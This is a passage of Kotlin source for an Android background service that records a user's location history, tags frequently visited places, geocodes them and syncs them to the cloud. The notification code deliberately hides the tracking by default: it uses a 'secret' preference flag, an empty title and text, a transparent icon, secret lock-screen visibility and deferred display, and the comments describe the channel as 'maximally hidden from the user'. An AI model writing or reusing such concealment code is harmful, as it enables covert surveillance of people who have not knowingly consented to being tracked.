            val missing = mutableListOf<String>()
            if (!hasFgsLoc) missing.add("FOREGROUND_SERVICE_LOCATION")
            if (!hasFine) missing.add("ACCESS_FINE_LOCATION")
            if (!hasCoarse) missing.add("ACCESS_COARSE_LOCATION")
            val msg = "FGS location subtype unavailable; missing: ${missing.joinToString(", ")}. Falling back to plain FGS."
            Log.w("TimelineService", msg)
            try {
                ErrorLogger.logError(applicationContext, Throwable(msg), false)
            } catch (_: Exception) { }
        }
        return ok
    }

    private suspend fun handleNewLocation(location: Location) {
        // Adaptive sampling: switch mode based on movement speed
        val distanceFromLast = lastSavedLocation?.distanceTo(location) ?: Float.MAX_VALUE
        val shouldBeActive = distanceFromLast > MOVEMENT_THRESHOLD_M || location.speed > 1f

        if (shouldBeActive && !isInActiveMode) {
            requestLocationUpdates(active = true)
        } else if (!shouldBeActive && isInActiveMode) {
            requestLocationUpdates(active = false)
        }

        // Only save if we've moved meaningfully (avoid duplicate points when stationary)
        val minDistance = if (isInActiveMode) 20f else 80f
        if (lastSavedLocation != null && distanceFromLast < minDistance) {
            // Still in the same spot — check for significant place detection
            detectSignificantPlace(location)
            return
        }

        // Create and persist the new timeline point
        val pointId = UUID.randomUUID().toString()
        val point = TimelineLocationPoint(
            id = pointId,
            latitude = location.latitude,
            longitude = location.longitude,
            altitude = location.altitude,
            accuracy = location.accuracy,
            speedMetersPerSec = location.speed,
            timestamp = System.currentTimeMillis()
        )

        timelineRepository.insertPoint(point)
        lastSavedLocation = location
        pointsSinceLastSync++

        // Reset cluster anchor since we moved
        clusterStartMs = System.currentTimeMillis()
        clusterAnchorLat = location.latitude
        clusterAnchorLon = location.longitude
        clusterCandidateId = pointId

        // Geocode the point asynchronously
        geocodePoint(pointId, location.latitude, location.longitude)

        // Trigger cloud sync every N points
        if (pointsSinceLastSync >= SYNC_EVERY_N_POINTS) {
            pointsSinceLastSync = 0
            try {
                TimelineSyncManager.syncWithCloud(this)
            } catch (e: Exception) {
                Log.w("TimelineService", "Sync failed silently: ${e.message}")
            }
        }
    }

    private suspend fun detectSignificantPlace(location: Location) {
        // Check if this is near the current cluster anchor
        val anchorLoc = Location("").apply {
            latitude = clusterAnchorLat
            longitude = clusterAnchorLon
        }
        val distFromAnchor = anchorLoc.distanceTo(location)

        if (distFromAnchor <= CLUSTER_RADIUS_M) {
            val stayDurationMs = System.currentTimeMillis() - clusterStartMs
            if (stayDurationMs >= CLUSTER_MIN_STAY_MS) {
                // Mark the anchor point as a significant place
                clusterCandidateId?.let { id ->
                    timelineRepository.markSignificantPlace(id, stayDurationMs)
                    clusterCandidateId = null // Only mark once per cluster
                }
            }
        } else {
            // Moved away from cluster — reset
            clusterStartMs = System.currentTimeMillis()
            clusterAnchorLat = location.latitude
            clusterAnchorLon = location.longitude
        }
    }

    private fun geocodePoint(pointId: String, lat: Double, lon: Double) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val geocoder = Geocoder(this@LocationTimelineService, Locale.getDefault())
                val addresses = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    // Use the new async API on API 33+
                    kotlinx.coroutines.suspendCancellableCoroutine { cont ->
                        geocoder.getFromLocation(lat, lon, 1) { addrs ->
                            cont.resume(addrs, null)
                        }
                    }
                } else {
                    @Suppress("DEPRECATION")
                    geocoder.getFromLocation(lat, lon, 1)
                }

                if (!addresses.isNullOrEmpty()) {
                    val addr = addresses[0]
                    val label = when {
                        addr.featureName != null && addr.featureName != addr.thoroughfare ->
                            addr.featureName ?: ""
                        addr.thoroughfare != null -> addr.thoroughfare ?: ""
                        addr.subLocality != null -> addr.subLocality ?: ""
                        addr.locality != null -> addr.locality ?: ""
                        else -> ""
                    }
                    val subLabel = listOfNotNull(addr.subLocality, addr.locality, addr.adminArea)
                        .filter { it.isNotBlank() }
                        .distinct()
                        .take(2)
                        .joinToString(", ")

                    // Heuristic category icon detection
                    val icon = detectPlaceIcon(label)

                    if (label.isNotBlank()) {
                        timelineRepository.updatePlaceLabel(pointId, label, subLabel, icon)
                        lastPlaceLabel = label
                        lastPlaceSubLabel = subLabel
                        lastPlaceCategoryIcon = icon
                    }
                }
            } catch (e: Exception) {
                Log.w("TimelineService", "Geocoding failed for $pointId: ${e.message}")
            }
        }
    }

    private fun detectPlaceIcon(label: String): String {
        val l = label.lowercase()
        return when {
            l.contains("home") || l.contains("house") || l.contains("residence") -> "home"
            l.contains("office") || l.contains("work") || l.contains("hq") -> "work"
            l.contains("cafe") || l.contains("coffee") || l.contains("starbucks") -> "local_cafe"
            l.contains("restaurant") || l.contains("food") || l.contains("kitchen") || l.contains("diner") -> "restaurant"
            l.contains("hospital") || l.contains("clinic") || l.contains("pharmacy") -> "local_hospital"
            l.contains("school") || l.contains("college") || l.contains("university") || l.contains("institute") -> "school"
            l.contains("mall") || l.contains("market") || l.contains("shop") || l.contains("store") -> "shopping_cart"
            l.contains("gym") || l.contains("fitness") || l.contains("sport") -> "fitness_center"
            l.contains("park") || l.contains("garden") || l.contains("forest") -> "park"
            l.contains("airport") || l.contains("terminal") -> "flight"
            l.contains("station") || l.contains("metro") || l.contains("bus") -> "directions_transit"
            l.contains("hotel") || l.contains("inn") || l.contains("lodge") -> "hotel"
            l.contains("bank") || l.contains("atm") -> "account_balance"
            else -> "location_on"
        }
    }

    private fun buildNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java).apply {
            action = "com.nexus.portal.ACTION_LOCATION_TIMELINE"
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val stopIntent = Intent(this, LocationTimelineService::class.java).apply {
            action = ACTION_STOP
        }
        val stopPendingIntent = PendingIntent.getService(
            this, 1, stopIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        
        // Check if developer wants to show the notification (default: hidden)
        val secretPrefs = getSharedPreferences("secret_prefs", Context.MODE_PRIVATE)
        val showNotif = secretPrefs.getBoolean("show_timeline_recording_notif", false)
        
        val channelId = if (showNotif) CHANNEL_ID_VISIBLE else CHANNEL_ID_SILENT
        
        // If showing notification, use a visible notification; otherwise use a silent minimized one
        return if (showNotif) {
            NotificationCompat.Builder(this, channelId)
                .setContentTitle("Nexus Timeline")
                .setContentText("Recording your location history")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setOnlyAlertOnce(true)
                .setContentIntent(pendingIntent)
                .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Stop", stopPendingIntent)
                .build()
        } else {
            // Silent notification for production — minimally visible, required by Android OS
            val builder = NotificationCompat.Builder(this, channelId)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(R.drawable.ic_transparent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setOngoing(true)
                .setOnlyAlertOnce(true)
                .setContentIntent(pendingIntent)
                .setSilent(true)
            
            // On Android 12+, defer the notification to minimize visibility
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                builder.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_DEFERRED)
            }
            
            builder.build()
        }
    }

    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            
            // Delete the old single channel (if it exists) to clean up cached settings
            try {
                manager.deleteNotificationChannel("location_timeline_channel")
            } catch (_: Exception) { /* ignore if it doesn't exist */ }
            
            // Visible channel: shown in status bar when user enables notification in secret settings
            val visibleChannel = NotificationChannel(
                CHANNEL_ID_VISIBLE,
                "Location Timeline",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Location timeline tracking notification (visible)"
                setShowBadge(false)
            }
            manager.createNotificationChannel(visibleChannel)
            
            // Silent channel: maximally hidden from the user (IMPORTANCE_MIN is the lowest Android allows for FGS)
            val silentChannel = NotificationChannel(
                CHANNEL_ID_SILENT,
                "Location Timeline (Silent)",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background location history tracking (silent, hidden from status bar)"
                setShowBadge(false)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
                enableLights(false)
                enableVibration(false)
            }
            manager.createNotificationChannel(silentChannel)
        }
    }
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        rideTrackerStateCollectorJob?.cancel()
        rideTrackerLocationCollectorJob?.cancel()
        locationCollectorJob?.cancel()
        sensorCollectorJob?.cancel()
                locationRepository.stopTrackingClient("timeline")
        _isRunning.value = false
    }

    private fun setupRideTrackerMonitoring() {
        rideTrackerStateCollectorJob?.cancel()
        rideTrackerStateCollectorJob = serviceScope.launch {
            try {
                com.nexus.portal.services.RideTrackerService.trackingState.collect { state ->
                    val shouldShare = state.isTracking || state.isPreRecording
                    if (shouldShare) {
                        if (!isSharingLocationFromRideTracker) {
                            isSharingLocationFromRideTracker = true
                            locationCollectorJob?.cancel()
                            locationRepository.stopTracking()
                            Log.d("TimelineService", "RideTracker is active. Suspended own GPS requests, sharing location.")
                        }
                    } else {
                        if (isSharingLocationFromRideTracker) {
                            isSharingLocationFromRideTracker = false
                            requestLocationUpdates(active = false)
                            Log.d("TimelineService", "RideTracker stopped. Resumed own GPS requests.")
                        }
                    }
                }
            } catch (e: Exception) {
                Log.w("TimelineService", "Failed to collect RideTracker trackingState: ${e.message}")
            }
        }

        rideTrackerLocationCollectorJob?.cancel()
        rideTrackerLocationCollectorJob = serviceScope.launch {
            try {
                com.nexus.portal.services.RideTrackerService.liveLocation.collect { location ->
                    if (location != null && isSharingLocationFromRideTracker) {
                        handleNewLocation(location)
                    }
                }
            } catch (e: Exception) {
                Log.w("TimelineService", "Failed to collect RideTracker liveLocation: ${e.message}")
            }
        }
    }
}
